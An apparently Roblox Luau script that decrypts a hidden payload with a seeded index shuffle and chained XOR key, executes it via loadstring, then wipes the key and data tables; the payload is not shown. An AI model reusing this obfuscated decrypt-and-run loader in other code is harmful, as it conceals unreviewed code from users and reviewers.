local function txuPurkfwexN()
    local UCGyOeepPWcb = {}
    local data = KCTYfTeooCcs._DATA
    local masterKey = KCTYfTeooCcs._K[1]
    local memSeed = KCTYfTeooCcs._K[2]
    local totalLen = KCTYfTeooCcs._K[3]
    
    local mappingTable = {}
    for i = 1, totalLen do mappingTable[i] = i end
    
    local current = memSeed
    local function lcgNext(min, max)
        current = (current * 1103515245 + 12345) % 0x80000000
        return min + (current % (max - min + 1))
    end
    
    for i = totalLen, 2, -1 do
        local j = lcgNext(1, i)
        mappingTable[i], mappingTable[j] = mappingTable[j], mappingTable[i]
    end
    
    local currentKey = masterKey
    local prevByte = 107
    local logicalIP = 1
    
    local STATE_ROUTER = 0xA1
    local STATE_RESOLVE = 0xB2
    local STATE_DECRYPT = 0xC3
    local STATE_TERMINATE = 0xF5
    local mState = STATE_ROUTER
    
    local targetPhysicalIndex = 0
    
    while mState ~= STATE_TERMINATE do
        if mState == STATE_ROUTER then
            if logicalIP > totalLen then
                mState = STATE_TERMINATE
            else
                mState = STATE_RESOLVE
            end
        elseif mState == STATE_RESOLVE then
            targetPhysicalIndex = mappingTable[logicalIP]
            mState = STATE_DECRYPT
        elseif mState == STATE_DECRYPT then
            local encryptedByte = data[targetPhysicalIndex]
            currentKey = bit32.band(bit32.bxor(currentKey, prevByte) + logicalIP, 0xFF)
            
            local decryptedByte = bit32.bxor(encryptedByte, currentKey)
            table.insert(UCGyOeepPWcb, string.char(decryptedByte))
            
            prevByte = decryptedByte
            logicalIP = logicalIP + 1
            
            if logicalIP % 100000 == 0 then
                task.wait()
            end
            mState = STATE_ROUTER
        end
    end
    
    local dynamicSource = table.concat(UCGyOeepPWcb)
    table.clear(UCGyOeepPWcb)
    table.clear(mappingTable)
    table.clear(KCTYfTeooCcs._DATA)
    table.clear(KCTYfTeooCcs._K)
    table.clear(KCTYfTeooCcs)
    
    local func, err = loadstring(dynamicSource)
    dynamicSource = nil
    
    if func then
        local success, runErr = pcall(func)
        if not success then
            warn("[VM Payload Runtime Error] " .. tostring(runErr))
        end
    else
        warn("[VM Decryption/Compilation Failure] " .. tostring(err))
    end
end

txuPurkfwexN()
